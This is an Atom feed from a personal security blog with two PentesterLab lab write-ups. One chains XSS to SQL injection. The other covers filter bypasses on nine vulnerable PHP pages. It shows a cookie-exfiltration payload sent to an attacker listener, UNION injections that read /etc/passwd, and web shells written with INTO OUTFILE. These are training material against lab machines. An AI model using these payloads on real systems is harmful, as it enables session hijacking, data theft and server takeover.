<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: xss | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/xss/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2018-05-25T09:32:05-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--Xss and MySQL FILE]]></title>
    <link href="http://wg135.github.io/blog/2016/04/12/pentesterlab-xss-and-mysql-file/"/>
    <updated>2016-04-12T13:19:35-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/12/pentesterlab-xss-and-mysql-file</id>
    <content type="html"><![CDATA[<p><em>It is time for you to act, LORD; your law is being broken.</em> &mdash; Psalm 119:126</p>

<p>This course details the exploitation of a Cross-Site Scripting in a PHP based website and how an attacker can use it to gain access to the administration pages. Then, using this access, the attacker will be able to gain code execution on the server using SQL injections.</p>

<p>From Pentesterlab:</p>

<p>The attack is divided into 2 steps:</p>

<ol>
<li>Detection and exploitation of Cross-Site Scripting vulnerabilities: in this part, you will learn how to detect and exploit Cross-Site Scripting vulnerabilities.</li>
<li>Access to the administration pages, then find and exploit a SQL injection to gain code execution. The last step in which you will access the operating system and run command.</li>
</ol>


<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>wfuzz</li>
<li>Zap</li>
<li>Firebug</li>
<li>Cookie Manager+</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
<li>Burte force hidden path of the server. &mdash;-wfuzz</li>
<li>Indetify XSS vuln and scan the website pages. &mdash;-Zap</li>
<li>Embeded script into page. &mdash;- Firebug</li>
<li>Deploy web shell.</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><code>nmap -sV -v -A 192.168.79.168</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>Use wfuzz to burte force hidden path of the server</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Also I lauched zap to scan the website, try to find interesting things such as injection points and hidden pages. two things are very interesting. First of all, zap raises a flag for a xss vulnerability:</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>it looks like zap has already inject <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> into that page. If you visit the link &ldquo;<a href="http://192.168.79.168/post.php?id=1">http://192.168.79.168/post.php?id=1</a>&rdquo;, it will pop up an alert 1.</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>We can use this xss vulnerability to steal admin&rsquo;s cookie.</p>

<p>keep going &hellip;</p>

<p>Before stealing admin&rsquo;s cookie, we have to setup listener on attacking machine,</p>

<p><code>python -m SimpleHTTPServer 4444</code></p>

<p>use this payload instead of alert(1) in the xss (use firebug to edit the html)</p>

<p><code>&lt;script&gt;document.write('&lt;img src="http://192.168.79.156:4444/?'+document.cookie+'  "/&gt;');&lt;/script&gt;</code></p>

<p>192.168.79.156 is attacker&rsquo;s machine.</p>

<p>Now we got the cookie.</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>put the cookie in Cookie Manager+</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>now visit <code>http://192.168.79.168/admin/</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Let&rsquo;s explore the admin&rsquo;s pages. First, click <code>edit</code>, it will go to <code>http://192.168.79.168/admin/edit.php?id=2</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>now looks like the url contains injection point, lets try to use single quote:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=2'</code></p>

<p>we get error message:</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we know that the web sites' absolute path is &ldquo;/var/www/&rdquo;</p>

<p>From <a href="https://pentesterlab.com/exercises/from_sqli_to_shell/course">pentesterlab</a></p>

<p>Exploiting SQL injection using UNION follows the steps below:</p>

<p> 1   Find the number of columns to perform the UNION
 2   Find what columns are echoed in the page
 3   Retrieve information from the database meta-tables
 4   Retrieve information from other tables/databases</p>

<p>In order to perform a request by SQL injection, you need to find the number of columns that are returned by the first part of the query. Unless you have the source code of the application, you will have to guess this number.</p>

<p>There are two methods to get this information:</p>

<p>1   using UNION SELECT and increase the number of columns;
2   using ORDER BY statement.</p>

<p>Here we use order by statement to get the number of columns</p>

<p><code>http://192.168.79.168/admin/edit.php?id=2 order by 4 --</code> good
<code>http://192.168.79.168/admin/edit.php?id=2 order by 5 --</code> error</p>

<p>Now that we know the number of columns, we can retrieve information from the database. Based on the error message we received, we know that the backend database used is MySQL.</p>

<p>get DB version:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,@@version,4</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>get /etc/passwd file:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,load_file("/etc/passwd"),4</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>get user info:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,user(),4</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>since the user is root, now we can deploy a webshell&hellip;</p>

<p>use <code>http://192.168.79.168/admin/edit.php?id=0 UNION SELECT 1,2,"&lt;?php @eval($_POST['pass'];)?&gt;",4 into outfile "/var/www/css/evil.php"</code> to create evil.php under css folder. Encode <code>http://192.168.79.168/admin/edit.php?id=0 UNION SELECT 1,2,"&lt;?php @eval($_POST['pass'];)?&gt;",4 into outfile "/var/www/css/evil.php"</code> part.</p>

<p>Now we can see that the evil.php is created successfully.</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>Cool&hellip; Lets write webshell now</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0 UNION select 1,2,"&lt;?php system($_GET['c']); ?&gt;",4 into outfile "/var/www/css/webshell.php"</code></p>

<p>of course. encode <code>0 UNION select 1,2,"&lt;?php system($_GET['c']); ?&gt;",4 into outfile "/var/www/css/webshell.php"</code></p>

<p>Now run command:</p>

<p><code>http://192.168.79.168/css/webshell.php?c=cat /etc/passwd</code></p>

<p>encode <code>/etc/passwd</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/tumblr_nqnzzzQJGq1rbc9h1o1_500.gif" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PentesterLab -- Web for Pentester - XSS]]></title>
    <link href="http://wg135.github.io/blog/2016/03/08/pentestlab-webforpentestr-xss/"/>
    <updated>2016-03-08T13:55:55-06:00</updated>
    <id>http://wg135.github.io/blog/2016/03/08/pentestlab-webforpentestr-xss</id>
    <content type="html"><![CDATA[<p>Web for Pentester:
    This exercise is a set of the most common web vulnerabilities</p>

<p>Difficluty: 1/5</p>

<!--more-->


<h3>Example1</h3>

<p>code review:</p>

<pre><code class="php example1.php">&lt;?php require_once '../header.php'; ?&gt;
&lt;html&gt;
Hello 
&lt;?php 
    echo $_GET["name"];
?&gt;

&lt;?php require_once '../footer.php'; ?&gt;
</code></pre>

<p>The vulnerability is due to no validaton of name.</p>

<p>exploit:</p>

<p><code>http://192.168.79.162/xss/example1.php?name=&lt;script&gt;alert("xss")&lt;/script&gt;</code></p>

<h3>Example2</h3>

<p>code review:</p>

<pre><code class="php example2.php">&lt;?php require_once '../header.php'; ?&gt;
Hello 
&lt;?php

    $name =  $_GET["name"];
    $name = preg_replace("/&lt;script&gt;/","", $name);
    $name = preg_replace("/&lt;\/script&gt;/","", $name);
echo $name;
?&gt;
&lt;?php require_once '../footer.php'; ?&gt;
</code></pre>

<p>In the above code, the developer filter <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>. However, I can use <code>&lt;Script&gt;alert('xss')&lt;/Script&gt;</code> to bypass it.</p>

<p>exploit:</p>

<p><code>http://192.168.79.162/xss/example2.php?name=&lt;Script&gt;alert("xss")&lt;/Script&gt;</code></p>

<h3>Example 3</h3>

<p>code review:</p>

<pre><code class="php example3.php">&lt;?php require_once '../header.php'; ?&gt;
Hello 
&lt;?php

    $name =  $_GET["name"];
    $name = preg_replace("/&lt;script&gt;/i","", $name);
    $name = preg_replace("/&lt;\/script&gt;/i","", $name);
echo $name;
?&gt;

&lt;?php require_once '../footer.php'; ?&gt;
</code></pre>

<p>The developer tris to filter both lower case and upper case letter. I can use <code>recursion method</code> bypass this.</p>

<p>exploit:</p>

<p><code>http://192.168.79.162/xss/example3.php?name=&lt;scr&lt;script&gt;ipt&gt;alert("xss")&lt;/scr&lt;/script&gt;ipt&gt;</code></p>

<h2>Example 4</h2>

<p>code review:</p>

<pre><code class="php example4.php">&lt;?php require_once '../header.php'; 

if (preg_match('/script/i', $_GET["name"])) {
  die("error");
}
?&gt;

Hello &lt;?php  echo $_GET["name"]; ?&gt;
&lt;?php require_once '../footer.php'; ?&gt;  
</code></pre>

<p>The developer tris to completely filter <code>script</code>. I can use <code>img</code> to bypass it.</p>

<p>exploit:</p>

<p><code>http://192.168.79.162/xss/example4.php?name=&lt;img src="xx" onerror="alert('xss')"/&gt;</code></p>

<h3>Example5</h3>

<p>code review:</p>

<pre><code class="php example5.php">&lt;?php require_once '../header.php'; 

if (preg_match('/alert/i', $_GET["name"])) {
  die("error");
}
?&gt;

Hello &lt;?php  echo $_GET["name"]; ?&gt;
&lt;?php require_once '../footer.php'; ?&gt;  
</code></pre>

<p>The devekoper filter <code>alert</code>. I can use <code>fromCharCode</code> to build alert payload.</p>

<p>exploit:</p>

<p><code>http://192.168.79.162/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</code></p>

<h3>Example 6</h3>

<p>code review:</p>

<p>```php example6.php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello</p>

<script>
    var $a= "<?php  echo $_GET["name"]; ?>";
</script>


<pre><code>&lt;?php require_once '../footer.php'; ?&gt;
</code></pre>

<pre><code>The input name variable is between `&lt;script&gt;`, so we can just close the double quote and use `\\` to comment the reset of code.

exploit:

`http://192.168.79.162/xss/example6.php?name=";alert("xss");//
`



###Example 7

code review
</code></pre>

<p>&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello</p>

<script>
    var $a= '<?php  echo htmlentities($_GET["name"]); ?>';
</script>


<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?></p>

<pre><code>The developer uses `htmlentities()` to encode special characters. However, it does not encode single quotes `'`, so that I can use single quote to close it and comment the rest of the code

exploit:

`http://192.168.79.162/xss/example7.php?name=';alert('xss');//`



###Example 8

code review
</code></pre>

<p>&lt;?php
  require_once &lsquo;../header.php&rsquo;;</p>

<p>  if (isset($<em>POST[&ldquo;name&rdquo;])) {
    echo &ldquo;HELLO &rdquo;.htmlentities($</em>POST[&ldquo;name&rdquo;]);
  }
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>&ldquo; method="POST&rdquo;>
  Your name:<input type="text" name="name" />
  <input type="submit" name="submit"/></p>

<p>&lt;?php</p>

<p>  require_once &lsquo;../footer.php&rsquo;;</p>

<p>?></p>

<pre><code>The developer does not valid the parpmeter `PHP_SELF` so that I can bypass it.

exploit:

`http://192.168.79.162/xss/example8.php/" onmouseover="alert('xss')`


###Example 9

code review
</code></pre>

<p>&lt;?php require_once &lsquo;../header.php&rsquo;; ?></p>

<script>
  document.write(location.hash.substring(1));
</script>


<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
<code>``
The user input is after</code>#`. This is a DOM-based XSS vuln.</p>

<p>exploit:</p>

<p><code>http://192.168.79.162/xss/example9.php#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
]]></content>
  </entry>
  
</feed>
